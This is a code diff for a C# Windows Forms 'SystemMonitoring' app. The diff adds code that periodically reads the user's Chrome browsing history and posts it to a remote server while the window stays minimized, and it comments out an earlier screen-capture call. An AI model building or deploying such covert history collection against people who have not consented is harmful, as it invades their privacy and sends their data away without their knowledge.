@@ -9,6 +9,8 @@ using System.Threading.Tasks;
 using System.Windows.Forms;
 using SystemMonitoring.BusinessLogic;
 using ChromeData;
+using System.Net.Http;
+
 namespace SystemMonitoring.Forms
 {
     public partial class Welcome : Form
@@ -17,7 +19,9 @@ namespace SystemMonitoring.Forms
         public Welcome()
         {
             InitializeComponent();
-            
+
+            ChromeHistory ch = new ChromeHistory("");
+            ch.SaveLastTime();
             timer1.Start();
 
             this.WindowState = FormWindowState.Minimized;
@@ -38,13 +42,24 @@ namespace SystemMonitoring.Forms
                     /*
                      *save last time 
                      * get history
+                     * 
                      */
+
+                    ChromeHistory ch = new ChromeHistory("");
+                    List<HistoryItem> history = ch.GetHistory();
+                    if(history.Count > 0)
+                    {
+
+                        HttpResponseMessage msg = PostData.SendToServer(history, "history");
+                        Console.WriteLine("Status Code " + msg.StatusCode);
+                        ch.SaveLastTime();
+                    }
                 }
                 this.Text = "Done";
                 _ticks = 0;
-                CaptureScreen cs = new CaptureScreen();
-                cs.Screenshot();
-                DateTime dt = DateTime.Now;
+                //CaptureScreen cs = new CaptureScreen();
+                //cs.Screenshot();
+                //DateTime dt = DateTime.Now;
 
                 
             }
